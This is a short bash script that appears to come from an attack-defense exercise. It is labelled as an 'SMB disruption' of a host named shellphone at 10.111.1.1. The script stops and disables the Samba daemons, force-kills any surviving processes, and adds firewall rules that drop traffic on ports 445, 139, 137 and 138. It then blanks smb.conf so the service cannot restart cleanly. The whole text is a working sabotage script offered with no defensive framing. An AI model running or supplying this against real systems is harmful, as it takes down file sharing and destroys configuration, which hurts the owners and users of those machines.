#!/bin/bash
# shellphone (10.111.1.1) - SMB disruption
# Targets smbd/nmbd (Samba) — most likely SMB stack on Linux

# Stop and disable the services
systemctl stop smbd nmbd winbind 2>/dev/null
systemctl disable smbd nmbd winbind 2>/dev/null

# Kill any surviving processes
pkill -9 smbd 2>/dev/null
pkill -9 nmbd 2>/dev/null

# Block the ports at the firewall
iptables -I INPUT -p tcp --dport 445 -j DROP
iptables -I INPUT -p tcp --dport 139 -j DROP
iptables -I INPUT -p udp --dport 137 -j DROP
iptables -I INPUT -p udp --dport 138 -j DROP

# Corrupt the config so it can't restart cleanly
if [ -f /etc/samba/smb.conf ]; then
    cp /etc/samba/smb.conf /etc/samba/smb.conf.bak 2>/dev/null
    echo "" > /etc/samba/smb.conf
fi

echo "[*] SMB disruption complete on shellphone"
